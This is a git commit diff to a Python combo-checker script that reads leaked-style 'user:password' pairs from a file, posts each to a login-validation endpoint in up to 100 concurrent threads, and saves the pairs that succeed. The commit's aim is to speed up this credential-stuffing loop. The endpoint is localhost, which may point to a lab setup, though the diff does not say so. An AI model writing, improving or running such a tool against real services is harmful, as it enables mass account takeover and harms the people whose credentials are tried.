b286f9fffbee4c9c9943bb44ae54ec10472a6181
Javier Gómez Santos <jgosanto@everis.com>
2020-10-31 12:49:41 +0100

    Fixed multithreading

--- MultiThreadChecker.py
+++ MultiThreadChecker.py
@@ -3,7 +3,7 @@ import tokenize
 import concurrent.futures
 
 
-def getCombo(inputFile, outFile):
+def getCombo(inputFile):
     totalProcessed = 0
     tempFile = tokenize.open(inputFile)
     fileEncoding = tempFile.encoding
@@ -13,23 +13,37 @@ def getCombo(inputFile, outFile):
                 (user, password) = linea.replace("\r", "").replace("\n", "").split(":")
                 payload = {'user': user,
                            'pass': password}
-                yield (payload, outFile)
                 totalProcessed += 1
-                if totalProcessed % 10000 == 0:
-                    print("Processed "+str(int(totalProcessed/1000)+"K"))
+                if totalProcessed % 1000 == 0:
+                    print("Processed "+str(int(totalProcessed/1000))+"K")
+                yield payload
 
-
-def checkCombo(payloadAndOutFile):
-    (payload, outFile) = payloadAndOutFile
+def checkCombo(payload):
     respuesta = requests.post('http://localhost:5002/validateLogin', data=payload)
     if respuesta.status_code == 200:
-        print(payload['user'], payload['pass'])
-        outFile.write(payload['user']+":"+payload['pass']+"\n")
-
+        return payload
+    return None
 
 if __name__ == '__main__':
+
+
     inputFile = 'combo.txt'
     outputFile = 'outputMulti.txt'
+    MAX_CONCURRENT = 100
+    comboGenerator = getCombo(inputFile)
+    stillWorking = True
     with open(outputFile, 'w') as outFile:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-            executor.map(checkCombo, getCombo(inputFile, outFile))
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                while stillWorking:
+                    futures = []
+                    for url in range(MAX_CONCURRENT):
+                        try:
+                            currentValue = next(comboGenerator)
+                            futures.append(executor.submit(checkCombo, payload=currentValue))
+                        except:
+                            stillWorking = False
+                    for future in concurrent.futures.as_completed(futures):
+                        respuesta = future.result()
+                        if respuesta:
+                            outFile.write(respuesta['user']+":"+respuesta['pass']+"\n")
+                            print(respuesta)
